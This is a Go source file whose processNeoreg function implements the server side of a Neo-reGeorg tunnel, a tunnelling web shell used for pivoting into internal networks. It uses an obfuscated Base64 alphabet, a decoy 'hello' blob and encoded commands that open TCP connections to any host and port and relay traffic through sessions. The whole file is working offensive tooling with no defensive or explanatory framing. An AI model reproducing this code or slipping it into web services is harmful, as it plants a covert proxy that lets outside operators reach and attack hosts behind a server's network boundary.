package services

import (
	"bytes"
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"math/rand"
	"net"
	"sync"
	"time"
)

var (
	DATA          = 1
	CMD           = 2
	MARK          = 3
	STATUS        = 4
	ERROR         = 5
	IP            = 6
	PORT          = 7
	REDIRECTURL   = 8
	FORCEREDIRECT = 9

	en = []byte("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/")
	de = []byte("r0soKydO9GIHlpmDYQAenZh6R+wg2jEuvcMWf5Ui4tSkXJCa7zPB13Vb/TxNLq8F")

	// 使用 RWMutex 保护 map
	enMapMutex sync.RWMutex
	deMapMutex sync.RWMutex
	en_map     = make(map[byte]byte)
	de_map     = make(map[byte]byte)

	neoreg_hello = []byte("DsKJHA09nZZWweyQ+KtxZAJkw3nzhZyxnfTnhZt0QbQ5Qiypg6ZVRb5SnVze26KTmKzzR1lal60JQ6QleAL1EWybR6lzwfcW+iy321J/AZyoZB+nlephwUfVhfK1AVjYEsrJHe/=")

	// 使用 RWMutex 保护 sessions map
	sessionsMutex sync.RWMutex
	sessions      = make(map[string]*session)

	// 用于确保 map 只初始化一次
	once1 sync.Once
)

func zip(tomap map[byte]byte, a []byte, b []byte) {
	size := len(a)
	for i := 0; i < size; i++ {
		tomap[a[i]] = b[i]
	}
}

// 初始化 maps，确保只执行一次
func initMaps() {
	once1.Do(func() {
		enMapMutex.Lock()
		deMapMutex.Lock()
		defer enMapMutex.Unlock()
		defer deMapMutex.Unlock()

		zip(en_map, en, de)
		zip(de_map, de, en)
	})
}

func base64decode(data []byte) ([]byte, error) {
	// 确保 maps 已初始化
	initMaps()

	size := len(data)
	out := make([]byte, size)

	// 读取 de_map 时需要加读锁
	deMapMutex.RLock()
	for i := 0; i < size; i++ {
		n := de_map[data[i]]
		if n == 0 {
			out[i] = data[i]
		} else {
			out[i] = n
		}
	}
	deMapMutex.RUnlock()

	return base64.StdEncoding.DecodeString(string(out))
}

func base64encode(rawdata []byte) []byte {
	// 确保 maps 已初始化
	initMaps()

	data := []byte(base64.StdEncoding.EncodeToString(rawdata))
	size := len(data)
	out := make([]byte, size)

	// 读取 en_map 时需要加读锁
	enMapMutex.RLock()
	for i := 0; i < size; i++ {
		n := en_map[data[i]]
		if n == 0 {
			out[i] = data[i]
		} else {
			out[i] = n
		}
	}
	enMapMutex.RUnlock()

	return out
}

func blv_decode(data []byte) map[int][]byte {
	info := make(map[int][]byte)
	in := bytes.NewReader(data)
	var b_byte byte
	var l_int32 int32

	for true {
		err := binary.Read(in, binary.BigEndian, &b_byte)
		if err != nil {
			break
		}
		binary.Read(in, binary.BigEndian, &l_int32)
		b := int(b_byte)
		l := int(l_int32) - 1684250497

		v := make([]byte, l)
		in.Read(v)
		info[b] = v
	}
	return info
}

func randbyte() []byte {
	min := 5
	max := 20
	length := rand.Intn(max-min-1) + 1
	data := make([]byte, length)
	rand.Read(data)
	return data
}

func blv_encode(info map[int][]byte) []byte {
	info[0] = randbyte()
	info[39] = randbyte()

	data := bytes.NewBuffer([]byte{})
	for b, v := range info {
		l := len(v)
		binary.Write(data, binary.BigEndian, byte(b))
		binary.Write(data, binary.BigEndian, int32(l)+1684250497)
		binary.Write(data, binary.BigEndian, v)
	}
	return data.Bytes()
}

func newSession(conn net.Conn) *session {
	sess := &session{
		conn:  conn,
		buf:   new(bytes.Buffer),
		input: make(chan []byte, 100),
	}

	go func() {
		for {
			buf := make([]byte, 513)
			n, err := sess.conn.Read(buf)
			if err != nil {
				return
			}

			for sess.buf.Len() > 524288 {
				time.Sleep(10 * time.Millisecond)
			}

			sess.buf.Write(buf[:n])
		}
		sess.Close()
	}()

	go func() {
		for !sess.closed {
			select {
			case data, ok := <-sess.input:
				if !ok {
					return
				}
				_, err := sess.conn.Write(data)
				if err != nil {
					return
				}
			}
		}
		sess.Close()
	}()
	return sess
}

type session struct {
	conn   net.Conn
	buf    *bytes.Buffer
	input  chan []byte
	closed bool
	mu     sync.RWMutex // 保护 closed 状态
}

func (sess *session) Write(buf []byte) error {
	sess.mu.RLock()
	closed := sess.closed
	sess.mu.RUnlock()

	if closed {
		return fmt.Errorf("conn closed")
	}

	select {
	case sess.input <- buf:
		return nil
	default:
		return fmt.Errorf("input channel full")
	}
}

func (sess *session) Close() {
	sess.mu.Lock()
	if sess.closed {
		sess.mu.Unlock()
		return
	}
	sess.closed = true
	sess.mu.Unlock()

	sess.conn.Close()
	close(sess.input)
}

func processNeoreg(data []byte) []byte {
	// 处理 hello 消息
	if len(data) < 10 {
		hello, _ := base64decode(neoreg_hello)
		return hello
	}

	out, err := base64decode(data)
	if err != nil || len(out) == 0 {
		hello, _ := base64decode(neoreg_hello)
		return hello
	}

	info := blv_decode(out)
	rinfo := make(map[int][]byte)

	cmd := string(info[CMD])
	mark := string(info[MARK])

	switch cmd {
	case "CONNECT":
		ip := string(info[IP])
		port_str := string(info[PORT])
		targetAddr := ip + ":" + port_str
		conn, err := net.DialTimeout("tcp", targetAddr, time.Millisecond*3000)
		if err == nil {
			sessionsMutex.Lock()
			sessions[mark] = newSession(conn)
			sessionsMutex.Unlock()
			rinfo[STATUS] = []byte("OK")
		} else {
			rinfo[STATUS] = []byte("FAIL")
			rinfo[ERROR] = []byte(err.Error())
		}

	case "FORWARD":
		sessionsMutex.RLock()
		sess := sessions[mark]
		sessionsMutex.RUnlock()

		if sess != nil {
			data := info[DATA]
			err := sess.Write(data)
			if err == nil {
				rinfo[STATUS] = []byte("OK")
			} else {
				rinfo[STATUS] = []byte("FAIL")
				rinfo[ERROR] = []byte(err.Error())
			}
		} else {
			rinfo[STATUS] = []byte("FAIL")
			rinfo[ERROR] = []byte("session is closed")
		}

	case "READ":
		sessionsMutex.RLock()
		sess := sessions[mark]
		sessionsMutex.RUnlock()

		if sess != nil {
			rinfo[STATUS] = []byte("OK")

			// 读取数据时加锁保护 buf
			sess.mu.RLock()
			if sess.buf.Len() > 0 {
				dataCopy := make([]byte, sess.buf.Len())
				copy(dataCopy, sess.buf.Bytes())
				rinfo[DATA] = dataCopy
				sess.buf.Reset()
			}
			sess.mu.RUnlock()
		} else {
			rinfo[STATUS] = []byte("FAIL")
			rinfo[ERROR] = []byte("session is closed")
		}

	case "DISCONNECT":
		sessionsMutex.RLock()
		sess := sessions[mark]
		sessionsMutex.RUnlock()

		if sess != nil {
			sessionsMutex.Lock()
			delete(sessions, mark)
			sessionsMutex.Unlock()
			sess.Close()
		}

	default:
		hello, _ := base64decode(neoreg_hello)
		return hello
	}

	data = blv_encode(rinfo)
	return base64encode(data)
}

// 添加一个清理函数，定期清理过期的 sessions
func CleanupSessions() {
	ticker := time.NewTicker(5 * time.Minute)
	go func() {
		for range ticker.C {
			sessionsMutex.Lock()
			for key, sess := range sessions {
				sess.mu.RLock()
				closed := sess.closed
				sess.mu.RUnlock()

				if closed {
					delete(sessions, key)
				}
			}
			sessionsMutex.Unlock()
		}
	}()
}
